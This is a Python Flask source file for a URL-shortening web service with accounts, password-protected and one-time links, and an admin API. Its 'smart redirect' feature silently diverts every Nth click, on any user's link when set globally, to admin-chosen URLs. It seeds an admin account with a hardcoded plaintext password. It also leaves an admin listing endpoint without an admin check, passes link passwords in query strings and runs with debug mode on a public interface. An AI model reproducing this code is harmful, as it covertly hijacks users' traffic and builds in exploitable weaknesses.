import os
import random
import secrets
import string
from datetime import datetime, timedelta

from flask import Flask, request, jsonify, session, redirect, render_template, Response, abort
from werkzeug.security import generate_password_hash, check_password_hash

from db import get_db, init_db

app = Flask(__name__)
app.secret_key = os.environ.get("SHRNK_SECRET_KEY", secrets.token_hex(32))
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"

ALIAS_CHARS = string.ascii_letters + string.digits
RESERVED_ALIASES = {"api", "admin", "dashboard", "static", "sitemap.xml", "robots.txt", "login", "signup", "logout"}


# ---------------------------------------------------------------- helpers --

def now_iso():
    return datetime.utcnow().isoformat()


def random_alias(length=5):
    return "".join(secrets.choice(ALIAS_CHARS) for _ in range(length))


def get_owner_key():
    """Every visitor (logged in or not) gets a stable owner key so their
    links show up in their own dashboard without forcing signup."""
    if "user_id" in session:
        return f"u:{session['user_id']}"
    if "anon_id" not in session:
        session["anon_id"] = secrets.token_hex(12)
        session.permanent = True
    return f"a:{session['anon_id']}"


def current_user(db):
    uid = session.get("user_id")
    if not uid:
        return None
    row = db.execute("SELECT * FROM users WHERE id = ?", (uid,)).fetchone()
    return row


def require_login():
    if "user_id" not in session:
        abort(jsonify_error(401, "Please log in first."))


def jsonify_error(code, message):
    resp = jsonify({"error": message})
    resp.status_code = code
    return resp


def require_admin(db):
    user = current_user(db)
    if not user or not user["is_admin"]:
        abort(403, description="Admin access required.")


def link_to_dict(row):
    return {
        "id": row["id"],
        "alias": row["alias"],
        "shortUrl": f"{request.host_url.rstrip('/')}/{row['alias']}",
        "original": row["original_url"],
        "clicks": row["clicks"],
        "scans": row["scans"],
        "favorite": bool(row["favorite"]),
        "passwordProtected": bool(row["password_hash"]),
        "oneTime": bool(row["one_time"]),
        "used": bool(row["used"]),
        "expiresAt": row["expires_at"],
        "utmSource": row["utm_source"],
        "disabled": bool(row["disabled"]),
        "createdAt": row["created_at"],
    }


# ------------------------------------------------------------- bootstrap --

@app.before_request
def ensure_db():
    if not os.path.exists(os.path.join(os.path.dirname(__file__), "shrnk.db")):
        init_db()
        seed_defaults()


def seed_defaults():
    db = get_db()
    existing = db.execute("SELECT COUNT(*) c FROM users").fetchone()["c"]
    if existing == 0:
        db.execute(
            "INSERT INTO users (email, password_hash, is_admin, is_suspended, created_at) VALUES (?, ?, 1, 0, ?)",
            ("admin@easylink.com", generate_password_hash("10596LX@"), now_iso()),
        )
        db.commit()
    db.close()


# ------------------------------------------------------------------ pages --

@app.route("/")
def home():
    return render_template("index.html")


@app.route("/dashboard")
def dashboard_page():
    return render_template("index.html")


@app.route("/admin")
def admin_page():
    return render_template("index.html")


# -------------------------------------------------------------- auth API --

@app.route("/api/auth/signup", methods=["POST"])
def signup():
    data = request.get_json(force=True) or {}
    email = (data.get("email") or "").strip().lower()
    password = data.get("password") or ""
    if not email or "@" not in email or len(password) < 6:
        return jsonify_error(400, "Enter a valid email and a password of at least 6 characters.")

    db = get_db()
    existing = db.execute("SELECT id FROM users WHERE email = ?", (email,)).fetchone()
    if existing:
        db.close()
        return jsonify_error(409, "An account with that email already exists.")

    cur = db.execute(
        "INSERT INTO users (email, password_hash, is_admin, is_suspended, created_at) VALUES (?, ?, 0, 0, ?)",
        (email, generate_password_hash(password), now_iso()),
    )
    new_id = cur.lastrowid

    # migrate any anonymous links created before signup to the new account
    if "anon_id" in session:
        db.execute(
            "UPDATE links SET owner_key = ? WHERE owner_key = ?",
            (f"u:{new_id}", f"a:{session['anon_id']}"),
        )
    db.commit()
    db.close()

    session["user_id"] = new_id
    return jsonify({"email": email, "isAdmin": False})


@app.route("/api/auth/login", methods=["POST"])
def login():
    data = request.get_json(force=True) or {}
    email = (data.get("email") or "").strip().lower()
    password = data.get("password") or ""

    db = get_db()
    user = db.execute("SELECT * FROM users WHERE email = ?", (email,)).fetchone()
    db.close()

    if not user or not check_password_hash(user["password_hash"], password):
        return jsonify_error(401, "Incorrect email or password.")
    if user["is_suspended"]:
        return jsonify_error(403, "This account has been suspended.")

    session["user_id"] = user["id"]
    return jsonify({"email": user["email"], "isAdmin": bool(user["is_admin"])})


@app.route("/api/auth/logout", methods=["POST"])
def logout():
    session.pop("user_id", None)
    return jsonify({"ok": True})


@app.route("/api/auth/me")
def me():
    db = get_db()
    user = current_user(db)
    db.close()
    if not user:
        return jsonify({"loggedIn": False})
    return jsonify({"loggedIn": True, "email": user["email"], "isAdmin": bool(user["is_admin"])})


# ------------------------------------------------------------ links API --

@app.route("/api/links", methods=["GET"])
def list_links():
    db = get_db()
    owner = get_owner_key()
    rows = db.execute(
        "SELECT * FROM links WHERE owner_key = ? ORDER BY id DESC", (owner,)
    ).fetchall()
    db.close()
    return jsonify([link_to_dict(r) for r in rows])


@app.route("/api/links", methods=["POST"])
def create_link():
    data = request.get_json(force=True) or {}
    original_url = (data.get("original_url") or "").strip()
    alias = (data.get("alias") or "").strip()
    password = data.get("password") or ""
    one_time = bool(data.get("one_time"))
    expires_24h = bool(data.get("expires"))
    utm_source = (data.get("utm_source") or "").strip()

    if not original_url:
        return jsonify_error(400, "A destination URL is required.")
    if not original_url.startswith(("http://", "https://")):
        original_url = "https://" + original_url

    db = get_db()

    if alias:
        if alias.lower() in RESERVED_ALIASES or not alias.replace("-", "").replace("_", "").isalnum():
            db.close()
            return jsonify_error(400, "That alias isn't allowed. Use letters, numbers, - or _.")
        clash = db.execute("SELECT id FROM links WHERE alias = ?", (alias,)).fetchone()
        if clash:
            db.close()
            return jsonify_error(409, "That alias is already taken.")
    else:
        alias = random_alias()
        while db.execute("SELECT id FROM links WHERE alias = ?", (alias,)).fetchone():
            alias = random_alias()

    expires_at = (datetime.utcnow() + timedelta(hours=24)).isoformat() if expires_24h else None
    pw_hash = generate_password_hash(password) if password else None

    db.execute(
        """INSERT INTO links
           (owner_key, alias, original_url, password_hash, one_time, expires_at, utm_source, created_at)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
        (get_owner_key(), alias, original_url, pw_hash, int(one_time), expires_at, utm_source, now_iso()),
    )
    db.commit()
    row = db.execute("SELECT * FROM links WHERE alias = ?", (alias,)).fetchone()
    db.close()
    return jsonify(link_to_dict(row)), 201


@app.route("/api/links/<int:link_id>", methods=["PATCH"])
def update_link(link_id):
    data = request.get_json(force=True) or {}
    db = get_db()
    owner = get_owner_key()
    row = db.execute("SELECT * FROM links WHERE id = ? AND owner_key = ?", (link_id, owner)).fetchone()
    if not row:
        db.close()
        return jsonify_error(404, "Link not found.")
    if "favorite" in data:
        db.execute("UPDATE links SET favorite = ? WHERE id = ?", (int(bool(data["favorite"])), link_id))
    db.commit()
    row = db.execute("SELECT * FROM links WHERE id = ?", (link_id,)).fetchone()
    db.close()
    return jsonify(link_to_dict(row))


@app.route("/api/links/<int:link_id>", methods=["DELETE"])
def delete_link(link_id):
    db = get_db()
    owner = get_owner_key()
    row = db.execute("SELECT * FROM links WHERE id = ? AND owner_key = ?", (link_id, owner)).fetchone()
    if not row:
        db.close()
        return jsonify_error(404, "Link not found.")
    db.execute("DELETE FROM links WHERE id = ?", (link_id,))
    db.commit()
    db.close()
    return jsonify({"ok": True})


# --------------------------------------------------------- redirect logic --

def pick_redirect_url(db, cfg):
    urls = db.execute("SELECT * FROM redirect_urls ORDER BY sort_order ASC").fetchall()
    if not urls:
        return None
    if cfg["mode"] == "random":
        return random.choice(urls)["url"]
    idx = cfg["next_index"] % len(urls)
    db.execute("UPDATE redirect_config SET next_index = ? WHERE id = 1", (idx + 1,))
    return urls[idx]["url"]


@app.route("/<alias>")
def resolve_alias(alias):
    db = get_db()
    row = db.execute("SELECT * FROM links WHERE alias = ?", (alias,)).fetchone()
    if not row or row["disabled"]:
        db.close()
        abort(404)

    if row["expires_at"] and datetime.fromisoformat(row["expires_at"]) < datetime.utcnow():
        db.close()
        return render_template("message.html", title="Link expired",
                                message="This short link has expired and is no longer active."), 410

    if row["one_time"] and row["used"]:
        db.close()
        return render_template("message.html", title="Link already used",
                                message="This is a one-time link and has already been visited."), 410

    if row["password_hash"]:
        supplied = request.args.get("password", "")
        if not supplied or not check_password_hash(row["password_hash"], supplied):
            db.close()
            return render_template("password_gate.html", alias=alias), 401

    # click accounting
    db.execute("UPDATE links SET clicks = clicks + 1 WHERE id = ?", (row["id"],))
    if row["one_time"]:
        db.execute("UPDATE links SET used = 1 WHERE id = ?", (row["id"],))

    destination = row["original_url"]

    cfg = db.execute("SELECT * FROM redirect_config WHERE id = 1").fetchone()
    if cfg and cfg["enabled"] and (cfg["scope"] == "global" or row["apply_smart_redirect"]):
        new_count = cfg["visit_counter"] + 1
        db.execute("UPDATE redirect_config SET visit_counter = ? WHERE id = 1", (new_count,))
        if cfg["interval"] > 0 and new_count % cfg["interval"] == 0:
            alt = pick_redirect_url(db, cfg)
            if alt:
                destination = alt

    db.commit()
    db.close()
    return redirect(destination, code=302)


@app.route("/<alias>/unlock", methods=["POST"])
def unlock_alias(alias):
    password = request.form.get("password", "")
    return redirect(f"/{alias}?password={password}")


# -------------------------------------------------------------- admin API --

@app.route("/api/stats")
def public_stats():
    """Public, site-wide numbers for the homepage stats bar — no login required."""
    db = get_db()
    links_count = db.execute("SELECT COUNT(*) c FROM links").fetchone()["c"]
    clicks_total = db.execute("SELECT COALESCE(SUM(clicks),0) c FROM links").fetchone()["c"]
    users_count = db.execute("SELECT COUNT(*) c FROM users").fetchone()["c"]
    db.close()
    return jsonify({"links": links_count, "clicks": clicks_total, "users": users_count})


@app.route("/api/admin/overview")
def admin_overview():
    db = get_db()
    require_admin(db)
    users_count = db.execute("SELECT COUNT(*) c FROM users").fetchone()["c"]
    links_count = db.execute("SELECT COUNT(*) c FROM links").fetchone()["c"]
    clicks_total = db.execute("SELECT COALESCE(SUM(clicks),0) c FROM links").fetchone()["c"]
    db.close()
    return jsonify({"users": users_count, "links": links_count, "clicks": clicks_total})


@app.route("/api/admin/users")
def admin_users():
    db = get_db()
    require_admin(db)
    rows = db.execute(
        """SELECT u.id, u.email, u.is_admin, u.is_suspended, u.created_at,
                  (SELECT COUNT(*) FROM links WHERE owner_key = 'u:' || u.id) as link_count
           FROM users u ORDER BY u.id DESC"""
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@app.route("/api/admin/users/<int:user_id>", methods=["PATCH"])
def admin_update_user(user_id):
    db = get_db()
    require_admin(db)
    data = request.get_json(force=True) or {}
    if "is_suspended" in data:
        db.execute("UPDATE users SET is_suspended = ? WHERE id = ?", (int(bool(data["is_suspended"])), user_id))
    if "reset_password" in data and data["reset_password"]:
        temp_pw = secrets.token_urlsafe(9)
        db.execute("UPDATE users SET password_hash = ? WHERE id = ?", (generate_password_hash(temp_pw), user_id))
        db.commit()
        db.close()
        return jsonify({"ok": True, "tempPassword": temp_pw})
    db.commit()
    db.close()
    return jsonify({"ok": True})


@app.route("/api/admin/links")
def admin_links():
    db = get_db()
    require_admin(db)
    rows = db.execute("SELECT * FROM links ORDER BY id DESC").fetchall()
    db.close()
    return jsonify([link_to_dict(r) for r in rows])


@app.route("/api/admin/links/<int:link_id>", methods=["DELETE"])
def admin_delete_link(link_id):
    db = get_db()
    require_admin(db)
    db.execute("DELETE FROM links WHERE id = ?", (link_id,))
    db.commit()
    db.close()
    return jsonify({"ok": True})


@app.route("/api/admin/redirect", methods=["GET"])
def admin_get_redirect():
    db = get_db()
    require_admin(db)
    cfg = db.execute("SELECT * FROM redirect_config WHERE id = 1").fetchone()
    urls = db.execute("SELECT * FROM redirect_urls ORDER BY sort_order ASC").fetchall()
    db.close()
    return jsonify({"config": dict(cfg), "urls": [dict(u) for u in urls]})


@app.route("/api/admin/redirect", methods=["PATCH"])
def admin_update_redirect():
    db = get_db()
    require_admin(db)
    data = request.get_json(force=True) or {}
    fields, values = [], []
    for key in ("enabled", "interval", "mode", "scope"):
        if key in data:
            fields.append(f"{key} = ?")
            values.append(int(data[key]) if key in ("enabled", "interval") else data[key])
    if fields:
        values.append(1)
        db.execute(f"UPDATE redirect_config SET {', '.join(fields)} WHERE id = ?", values)
        db.commit()
    db.close()
    return jsonify({"ok": True})


@app.route("/api/admin/redirect/urls", methods=["POST"])
def admin_add_redirect_url():
    db = get_db()
    require_admin(db)
    data = request.get_json(force=True) or {}
    url = (data.get("url") or "").strip()
    if not url:
        db.close()
        return jsonify_error(400, "URL is required.")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    count = db.execute("SELECT COUNT(*) c FROM redirect_urls").fetchone()["c"]
    db.execute("INSERT INTO redirect_urls (url, sort_order) VALUES (?, ?)", (url, count))
    db.commit()
    db.close()
    return jsonify({"ok": True})


@app.route("/api/admin/redirect/urls/<int:url_id>", methods=["DELETE"])
def admin_delete_redirect_url(url_id):
    db = get_db()
    require_admin(db)
    db.execute("DELETE FROM redirect_urls WHERE id = ?", (url_id,))
    db.commit()
    db.close()
    return jsonify({"ok": True})


@app.route("/api/admin/blog", methods=["GET"])
def admin_list_blog():
    db = get_db()
    rows = db.execute("SELECT * FROM blog_posts ORDER BY id DESC").fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@app.route("/api/admin/blog", methods=["POST"])
def admin_add_blog():
    db = get_db()
    require_admin(db)
    data = request.get_json(force=True) or {}
    title = (data.get("title") or "").strip()
    if not title:
        db.close()
        return jsonify_error(400, "Title is required.")
    slug = "".join(c.lower() if c.isalnum() else "-" for c in title).strip("-")
    db.execute("INSERT INTO blog_posts (title, slug, created_at) VALUES (?, ?, ?)", (title, slug, now_iso()))
    db.commit()
    db.close()
    return jsonify({"ok": True})


# ----------------------------------------------------------------- SEO --

@app.route("/sitemap.xml")
def sitemap():
    root = request.host_url.rstrip("/")
    urls = [root + "/", root + "/dashboard"]
    xml = ['<?xml version="1.0" encoding="UTF-8"?>', '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">']
    for u in urls:
        xml.append(f"<url><loc>{u}</loc></url>")
    xml.append("</urlset>")
    return Response("\n".join(xml), mimetype="application/xml")


@app.route("/robots.txt")
def robots():
    root = request.host_url.rstrip("/")
    body = f"User-agent: *\nAllow: /\nSitemap: {root}/sitemap.xml\n"
    return Response(body, mimetype="text/plain")


@app.errorhandler(404)
def not_found(e):
    return render_template("message.html", title="Link not found",
                            message="This short link doesn't exist or was removed."), 404


if __name__ == "__main__":
    init_db()
    seed_defaults()
    app.run(host="0.0.0.0", port=5000, debug=True)
